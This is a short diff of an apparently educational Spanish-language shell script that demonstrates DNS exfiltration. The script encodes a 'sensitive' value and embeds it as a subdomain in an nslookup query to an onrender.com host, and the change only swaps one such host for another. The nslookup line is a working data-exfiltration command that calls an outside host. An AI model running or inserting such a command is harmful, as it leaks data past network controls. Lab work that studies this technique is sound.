@@ -8,7 +8,7 @@ echo "Dato original: $DATOS_SENSIBLES"
 echo "Dato codificado: $DATOS_CODIFICADOS"
 echo "Enviando consulta DNS con el payload incrustado..."
 
-nslookup "${DATOS_CODIFICADOS}.servidor-web-dmz-dcogollo.onrender.com"
+nslookup "${DATOS_CODIFICADOS}.servidor-web-dmz-fdmaturanac.onrender.com"
 
 echo "=== CONSULTA DNS ENVIADA ==="
 
